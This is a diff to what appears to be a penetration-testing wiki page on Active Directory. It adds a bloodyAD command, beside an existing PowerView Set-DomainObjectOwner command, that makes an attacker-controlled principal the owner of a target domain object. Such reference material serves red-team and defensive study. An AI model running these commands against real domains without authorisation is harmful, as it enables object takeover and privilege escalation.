@@ -22,4 +22,12 @@ From Windows systems, this can be achieved with [Set-DomainObjectOwner](https://
 Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
 ```
 {% endtab %}
+
+{% tab title="Windows/Linux" %}
+It can also be achieved with a python tool as [bloodyAD](https://github.com/CravateRouge/bloodyAD).
+```bash
+bloodyAD --host $DomainController -d $DOMAIN -u $ControlledUser -p $Password set owner $TargetObject $ControlledPrincipal
+```
+{% endtab %}
+
 {% endtabs %}
